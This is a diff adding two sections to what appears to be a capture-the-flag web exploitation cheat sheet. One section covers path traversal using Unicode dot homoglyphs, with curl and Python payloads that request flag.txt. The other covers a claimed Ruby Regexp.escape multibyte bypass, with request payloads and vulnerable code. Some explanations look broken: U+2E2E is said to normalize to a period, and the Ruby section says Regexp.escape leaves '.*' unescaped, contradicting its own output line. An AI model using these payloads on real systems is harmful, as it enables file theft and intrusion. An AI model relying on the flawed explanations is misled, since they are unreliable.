@@ -9,6 +9,8 @@
   - [Double URL Encoding](#double-url-encoding)
   - [Python os.path.join](#python-ospathjoin)
 - [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
+- [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
+- [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
 - [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
@@ -112,6 +114,93 @@ zip -y exploit.zip file.txt
 
 ### Python os.path.join
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
+
+---
+
+## Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)
+
+**Pattern:** U+2E2E (REVERSED QUESTION MARK, UTF-8: `E2 B8 AE`) normalizes to a period (U+002E, 0x2E) in some Python HTTP backends and Unicode normalization layers. Sending `%E2%B8%AE%E2%B8%AE/flag.txt` bypasses ASCII dot checks (`..` blocked) while the resolved path becomes `../flag.txt`.
+
+```bash
+# Standard path traversal blocked by ASCII dot check:
+curl "http://target/files/../../flag.txt"   # blocked: contains ".."
+
+# U+2E2E homoglyph bypass:
+curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
+# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
+```
+
+```python
+import requests
+
+# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
+# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations
+
+homoglyph_dot = '\u2E2E'
+payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"
+
+r = requests.get(f"http://target/files/{payload}")
+# If backend normalizes Unicode before filesystem access but after validation:
+print(r.text)
+```
+
+**Other Unicode dot homoglyphs to try:**
+```text
+U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
+U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
+U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
+U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
+```
+
+**Key insight:** Unicode normalization inconsistencies between the validation layer and execution layer enable path traversal with non-ASCII dot homoglyphs. U+2E2E is a lesser-known alternative to fullwidth tricks (U+FF0E). Test normalization forms NFKC and NFC — Python's `unicodedata.normalize('NFKC', char)` reveals what each character collapses to.
+
+---
+
+## Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)
+
+**Pattern:** Ruby's `Regexp.escape` operates byte-by-byte. A `%bf` byte followed by `%5c` (backslash) forms a valid GBK/Big5 multibyte character, consuming the backslash. This leaves subsequent characters unescaped, breaking the intended regex escaping.
+
+```ruby
+# Regexp.escape escapes special chars by prepending backslash
+# e.g., Regexp.escape("a.b") → "a\\.b"
+
+# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
+# Regexp.escape sees 0xBF → not a special char, passes through
+# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
+# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
+# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
+# The second backslash then escapes the NEXT character, not the intended one
+
+# Result: subsequent input characters become unescaped in the regex
+```
+
+```python
+# In a CTF context: HTTP request with GBK lead byte in parameter
+import requests
+
+# %bf%5c in URL-encoded form — in GBK this is one character
+# When Ruby calls Regexp.escape on the input, the backslash is consumed
+payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex
+
+r = requests.get("http://target/search", params={"q": payload})
+# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
+# The .* passes through unescaped, matching any string
+```
+
+**Exploitation scenario:**
+```ruby
+# Vulnerable code:
+pattern = /#{Regexp.escape(user_input)}/
+if flag.match(pattern)
+  puts "Match!"
+end
+
+# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
+# In GBK context: first two bytes are one char, leaving ".*" unescaped
+# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
+```
+
+**Key insight:** Byte-level escaping functions are vulnerable to multibyte character injection. A GBK/Big5 lead byte (0xBF) followed by 0x5C forms a valid single character, consuming the backslash that `Regexp.escape` just added. This leaves subsequent characters unescaped. Check for non-ASCII input handling in Ruby regex validation, especially when the application supports CJK character sets.
 
 ---
 
